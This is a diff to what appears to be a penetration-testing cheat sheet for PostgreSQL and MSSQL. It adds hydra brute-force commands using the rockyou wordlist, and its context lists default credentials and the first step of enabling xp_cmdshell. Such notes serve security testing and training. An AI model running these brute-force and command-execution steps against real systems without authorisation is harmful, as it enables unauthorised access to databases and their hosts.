@@ -29,11 +29,17 @@ psql -h <ip> -U <user> -p <port>
 #Default credentials
 postgres : postgres
 
+#Brute Force
+hydra -l postgres -P /usr/share/wordlists/rockyou.txt <host> postgres -t 10
+
 #Enumeration commnads (https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
 ```
 #### MSSQL
 ```
 impacket-mssqlclient <user>:<pass>@<ip_address> -windows-auth
+
+#Brute Force
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt <host> mssql -t 10
 
 #Enable xp_cmdshell
 sp_configure 'show advanced options', 1
